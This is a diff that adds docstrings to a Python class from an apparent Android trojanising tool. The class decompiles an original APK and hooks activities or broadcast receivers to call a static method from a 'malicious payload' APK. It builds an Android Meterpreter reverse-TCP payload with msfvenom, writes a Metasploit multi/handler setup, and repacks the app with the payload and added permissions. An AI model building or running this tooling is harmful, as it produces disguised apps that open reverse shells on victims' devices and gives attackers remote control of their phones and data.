@@ -17,14 +17,20 @@ class PackadroidSession():
         self.__activities = []
 
     def get_hooks(self):
+        """Returns the hooks of the current session."""
         return self.__hooks
 
     def list_hooks(self):
+        """Prints all added hooks to the console."""
         print("[*] Currently added Hooks:")
         for i in range(len(self.__hooks)):
             print("Hook " + str(i) + ": " + self.__hooks[i].print_hook())
     
     def remove_hook(self, index):
+        """ Removes hook with given index
+        :param index: Index for the hooks list
+        :type index: int
+        """
         if index >= len(self.__hooks):
             print("[!] Index too big, not removing any hook")
             return
@@ -32,9 +38,24 @@ class PackadroidSession():
         del self.__hooks[index]
 
     def is_original_apk_loaded(self):
+        """ Checks if an original apk has already been loaded
+
+        :return True is returned if apk has been loaded.
+                False is return if no apk has been loaded.
+
+        """
         return self.__original_apk_path != None
 
     def load_original_apk(self, apk_path):
+        """ Decompiles apk at given path and sets apk_loaded to true.
+        
+        :param apk_path: Path to the original application.
+        :type apk_path: str
+
+        :return Decompile path is returned if no error occured.
+                None is returned on error.
+
+        """
         if not os.path.isfile(apk_path):
             print("[-] No .apk file found at the given path!")
             return None
@@ -49,6 +70,25 @@ class PackadroidSession():
         return self.__original_apk_dec_path
 
     def add_hook(self, t, location, class_name, method_name, payload_apk_path):
+        """ Adds either an activity hook or a broadcast hook
+        :param t: Type of broadcast: Either activity or broadcast_receiver
+        :type t: str        
+        
+        :param location: Either activity name or broadcast name
+        :type location: str
+
+        :param class_name: The name of the class which holds the malicious payload.
+        :type class_name: str
+
+        :param method_name: The name of the STATIC method which holds the malicious payload.
+        :type method_name: str
+
+        :param payload_apk_path: Path to the malicious application.
+        :type payload_apk_path: str
+
+        :return Nothing is returned if no error occured.
+                None is returned on error.
+        """
         same_apk = [h for h in self.__hooks if h.get_payload_apk_path() == payload_apk_path]
         if (len(same_apk)) < 1:
             # We have not decompiled this apk before
@@ -73,6 +113,7 @@ class PackadroidSession():
         self.__hooks.append(hook.Hook(t, location, class_name, method_name, payload_apk_path, payload_dec_path))
 
     def list_activities(self):
+        """ Prints a list of the activities of the loaded original application. Each activity gets an index which can be used."""
         if not self.is_original_apk_loaded():
             return None
         manifest_path = os.path.join(self.__original_apk_dec_path, "AndroidManifest.xml")
@@ -81,13 +122,22 @@ class PackadroidSession():
         return self.__activities
 
     def list_permissions(self):
+        """ Prints a list of the permissions of the loaded original application."""
         permissions = manifest_analyzer.get_permissions(self.__original_apk_dec_path + "/AndroidManifest.xml")
         for p in permissions:
             print(p)
         return
 
     def generate_meterpreter(self, ip, lport):
-        """ executes meterpreter with the options given"""
+        """ Generates a reverse shell as apk file using Metasploit.
+        
+        :param ip: IP address which is used by the reverse shell for the callback
+        :type ip: str
+
+        :param lport: Port address which is used by the reverse shell for the callback
+        :type lport: int
+        
+        """
         command = "msfvenom -p android/meterpreter/reverse_tcp LHOST=" + ip + " LPORT=" + lport + " -o meterpreter.apk"
         proc = subprocess.Popen(command, stdout=subprocess.PIPE, shell=True)
         (out, err) = proc.communicate()
@@ -98,6 +148,14 @@ class PackadroidSession():
             sys.exit(1)
 
     def start_meterpreter_handler(self, ip, lport):
+        """Starts a handler for the reverse shell using Metasploit.
+        
+        :param ip: IP address which is used by the reverse shell for the callback
+        :type ip: str
+
+        :param lport: Port address which is used by the reverse shell for the callback
+        :type lport: int
+        """
         with open("meterpreter_options.txt", "w") as f:
             f.write("use exploit/multi/handler\n")
             f.write("set payload android/meterpreter/reverse_tcp\n")
@@ -110,6 +168,12 @@ class PackadroidSession():
         (out, err) = proc.communicate()
 
     def repack(self, output=None):
+        """ Starts the repacking Process. Adds all hooks to the original applicaiton. Adds all payloads to the original application. Adds all necessary permissions to the Manifest.
+        
+        :param output: Path/Name of the repacked application
+        :type output: str
+
+        """
         if not self.is_original_apk_loaded():
             print("[-] No original .apk file loaded. Use load_original!")
             return None
@@ -133,6 +197,7 @@ class PackadroidSession():
         return output
 
     def cleanup(self):
+        """ Removes all decompiled applications. Original applicaitons as well as Malicious Payloads."""
         if self.__original_apk_dec_path != None:
             print("[*] Removing the decompiled original apk!")
             shutil.rmtree(self.__original_apk_dec_path)
